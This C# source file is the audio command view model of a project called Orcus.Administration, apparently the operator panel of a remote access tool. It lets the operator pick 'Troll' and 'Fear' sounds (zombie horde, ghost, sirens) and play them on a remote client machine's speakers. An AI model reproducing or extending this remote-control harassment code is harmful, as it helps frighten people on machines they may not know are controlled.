using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.Audio;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Plugins.AudioPlugin;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Administration.ViewModels.CommandViewModels.Audio;
using Orcus.Shared.Commands.Audio;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class AudioViewModel : CommandView
    {
        private List<SoundOutDevice> _audioDevices;
        private bool _isEnabled;
        private RelayCommand _refreshAudioDevice;
        private IAudioFile _selectedAudioFile;
        private SoundOutDevice _selectedSoundOutDevice;
        private RelayCommand _sendCurrentAudioCommand;
        private RelayCommand _togglePlayPauseCommand;

        public override string Name { get; } = (string) Application.Current.Resources["Audio"];
        public override Category Category { get; } = Category.Fun;

        public List<IAudioFile> AudioFiles { get; set; }
        public AudioPlayer AudioPlayer { get; private set; }
        public AudioCommand AudioCommand { get; private set; }

        public List<SoundOutDevice> AudioDevices
        {
            get { return _audioDevices; }
            set { SetProperty(value, ref _audioDevices); }
        }

        public IAudioFile SelectedAudioFile
        {
            get { return _selectedAudioFile; }
            set
            {
                if (SetProperty(value, ref _selectedAudioFile))
                    AudioPlayer.Open(value);
            }
        }

        public SoundOutDevice SelectedSoundOutDevice
        {
            get { return _selectedSoundOutDevice; }
            set { SetProperty(value, ref _selectedSoundOutDevice); }
        }

        public bool IsEnabled
        {
            get { return _isEnabled; }
            set { SetProperty(value, ref _isEnabled); }
        }

        public RelayCommand TogglePlayPauseCommand
        {
            get
            {
                return _togglePlayPauseCommand ??
                       (_togglePlayPauseCommand = new RelayCommand(parameter => { AudioPlayer.TooglePlayPause(); }));
            }
        }

        public RelayCommand SendCurrentAudioCommand
        {
            get
            {
                return _sendCurrentAudioCommand ?? (_sendCurrentAudioCommand = new RelayCommand(parameter =>
                {
                    if (SelectedAudioFile == null || SelectedSoundOutDevice == null)
                        return;

                    AudioCommand.PlayAudio(SelectedAudioFile, SelectedSoundOutDevice, AudioPlayer.Volume);
                }));
            }
        }

        public RelayCommand RefreshAudioDevicesCommand
        {
            get
            {
                return _refreshAudioDevice ??
                       (_refreshAudioDevice = new RelayCommand(parameter => { AudioCommand.GetDevices(); }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            AudioFiles =
                new List<IAudioFile>(
                    PluginManager.Current.LoadedPlugins.OfType<AudioPlugin>().SelectMany(x => x.Plugin.AudioFiles))
                {
                    new AudioFile((string) Application.Current.Resources["CameraShutter"], 0, AudioGenre.Troll, 1),
                    new AudioFile((string) Application.Current.Resources["Laughing"], 1, AudioGenre.Troll, 2),
                    new AudioFile((string) Application.Current.Resources["ComeOutAndPlayWithMe"], 2, AudioGenre.Fear, 31),
                    new AudioFile((string) Application.Current.Resources["Death"], 3, AudioGenre.Fear, 2),
                    new AudioFile((string) Application.Current.Resources["DemonGrirlsMockingbird"], 4, AudioGenre.Fear,
                        16),
                    new AudioFile((string) Application.Current.Resources["Fly"], 5, AudioGenre.Troll, 23),
                    new AudioFile((string) Application.Current.Resources["GhostOutOfMirror"], 6, AudioGenre.Fear, 19),
                    new AudioFile((string) Application.Current.Resources["Growl"], 7, AudioGenre.Fear, 4),
                    new AudioFile((string) Application.Current.Resources["HellMarch"], 8, AudioGenre.Fear, 25),
                    new AudioFile((string) Application.Current.Resources["Mosquito"], 9, AudioGenre.Troll, 23),
                    new AudioFile("Slender", 10, AudioGenre.Fear, 8),
                    new AudioFile((string) Application.Current.Resources["TornadoSirens"], 11, AudioGenre.Fear, 45),
                    new AudioFile("WTF", 12, AudioGenre.Voice, 3),
                    new AudioFile((string) Application.Current.Resources["ZombieHorde"], 13, AudioGenre.Fear, 21)
                }.OrderBy(x => x.Genre).ThenBy(x => x.Name).ToList();

            AudioPlayer = new AudioPlayer();
            clientController.Disconnected += Controller_Disconnected;
            AudioCommand = clientController.Commander.GetCommand<AudioCommand>();
            AudioCommand.AudioDevicesReceived += AudioCommand_AudioDevicesReceived;
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/AudioPlayback_16x.png", UriKind.Absolute));
        }

        private void Controller_Disconnected(object sender, EventArgs e)
        {
            AudioPlayer.Dispose();
        }

        private void AudioCommand_AudioDevicesReceived(object sender, List<SoundOutDevice> e)
        {
            IsEnabled = true;
            SelectedSoundOutDevice = null;
            AudioDevices = e;
            SelectedSoundOutDevice = AudioDevices.FirstOrDefault(x => x.IsDefault) ??
                                     AudioDevices.First();
        }

        public override void LoadView(bool loadData)
        {
            AudioCommand.GetDevices();
        }
    }
}